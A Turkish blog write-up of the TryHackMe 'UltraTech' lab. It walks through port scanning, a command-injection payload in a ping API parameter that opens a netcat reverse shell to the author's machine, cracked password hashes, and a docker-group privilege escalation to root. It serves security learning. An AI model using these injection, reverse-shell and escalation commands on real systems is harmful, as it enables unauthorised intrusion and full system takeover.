---
title: 'TryHackMe | UltraTech WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [command injection, docker]
render_with_liquid: false
---

Bu yazımda TryHackMe platformunda yer alan “UltraTech” isimli meydan okumayı çözeceğim. Meydan okumada bir sürü görev verildiğinden akışı bozmaması adına görevleri buraya yazmayacağım.

```console
$ nmap -sV -sC -T4 10.10.4.48
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Port taraması ile beraber varsayılan scriptleri çalıştırmasını ve tespit edilen servislerin sürümlerini göstermesini sağladım. 21 ve 22 numaralı portların sürümlerinde ve kendisinde bir sıkıntı yok. Belki 22 numaralı portta kullanıcıların açığa çıkarılmasıyla ilgili bir açık olabilir. 2.0 ve 7.7 sürümleri arasında kullanılan OpenSSH servisinde sistemdeki kullanıcı isimlerini açığa çıkaran bir zafiyet bulunuyor.

8081 numaralı HTTP servisine gelecek olursak Node.js Express Framework üzerinde çalışan bir API sistemi gibi görünüyor. Nmap taramasında “PUT” ve “DELETE” gibi metotların belirtildiğini görüyoruz. Ancak bu metotlarla isteklerde bulunduğumda sorun çıkarıyordu.

Tüm portları kontrol etmesi amacıyla tekrar bir nmap taraması yaptıktan sonra 31331 numaralı bir HTTP servisinin daha açık olduğunu öğrendim. Web sitesinde biraz dolaştıktan sonra aşağıdaki javascript kodları ile karşılaştım.

```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

Anlaşılan API üzerinden komut satırı elde edebileceğiz. Muhtemelen girilen veriler yeteri kadar veya hiç filtreden geçmediği için komut enjeksiyonuna yol açıyordur.

```
http://10.10.4.48:8081/ping?ip=`busybox nc 10.21.66.61 1234 -e /bin/bash`
```

```console
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.21.66.61] from (UNKNOWN) [10.10.4.48] 46686
id
uid=1002(www) gid=1002(www) groups=1002(www)
```

Komut enjeksiyonunu tespit ediyor ve reverse shell alıyorum. Daha sonra ise bulunduğum dizindeki sqlite veri tabanından hashleri alıyor ve hashes.com yardımıyla kırıyorum.

```
0d0ea5111e3c1def594c1684e3b9be84:mrshea**
f357a0c52799563c7c7b76c1e7543a32:n1009**
```

r00t kullanıcısına geçtikten sonra ilk olarak id komutunu kullandım ve kullanıcının docker grubunda olduğunu gördüm. Ayrıca herhangi bir docker konteynerı kullanılmıyor.

```console
r00t@ultratech-prod:/home$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:/home$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
```

docker’in çalışması için root haklarına sahip olması gerektiğini biliyoruz. Haliyle docker grubunda olduğumuza göre root haklarını elde edebilecek bir konteyner yaratabiliriz.

```console
r00t@ultratech-prod:/home$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# ls
private.txt
```

Yeni başlayanların mutlaka çözmesi gereken meydan okumalardan biri kendisi. Hem zor değil hemde çok kolay değil. Vakit ayırdığınız için teşekkür ederim.
